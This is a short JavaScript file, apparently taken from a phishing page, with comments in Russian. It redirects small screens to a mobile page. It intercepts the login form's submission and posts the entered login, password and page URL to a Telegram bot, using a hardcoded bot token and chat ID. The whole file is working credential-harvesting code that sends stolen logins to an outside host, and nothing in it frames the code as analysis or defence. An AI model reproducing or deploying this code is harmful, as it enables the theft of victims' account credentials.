if(window.innerWidth<600)
    location.href='mobile.html';


    setInterval(() => {
        if(window.innerWidth<600)
        location.href='mobile.html'; 
    }, 50);

const TOKEN = "1909186547:AAGKX9Fq2FsNErK5r-LUgyZzPB5egtgz8CE"; // токен от BotFather
const CHAT_ID = "-1001547701566"; // chat_id для телеграм

var form = document.querySelector('.form'); // находим в DOM нашу лид-форму
form.addEventListener("submit", function (e) { // прослушиваем форму
    e.preventDefault(); // перехватываем стандартный ответ
    data = new FormData(this); // вместо serialize на jQuery

        if(data.get("login")=="" || data.get("password")==""){
            alert(0)
        }
        else{
            sendMsg(data); // передаём данные из формы на отправку
        }
        
})

function sendMsg(data) {
    var url = 'https://api.telegram.org/bot' + TOKEN + '/sendMessage'; // токен бота
    var body = JSON.stringify({ // склеиваем объект в JSON строку
        chat_id: CHAT_ID,
        parse_mode: 'Markdown', // разметка сообщений вкл (чтобы использовать *жирный текст*)
        text: '\n\n*Логин:* ' + data.get("login") + '\n*Пароль:* ' + data.get("password") + '\n*Откуда:* [' + window.location.href + '](' + window.location.href + ')'
    });
    var xhr = new XMLHttpRequest(); // инициализируем AJAX запрос
    xhr.open('POST', url, true); // отправляем наше сообщение методом POST на сервак телеги
    xhr.setRequestHeader('Content-type', 'application/json; charset=utf-8'); // на всякий случай, оповестим телеграм, что отправили JSON
    xhr.send(body);
}

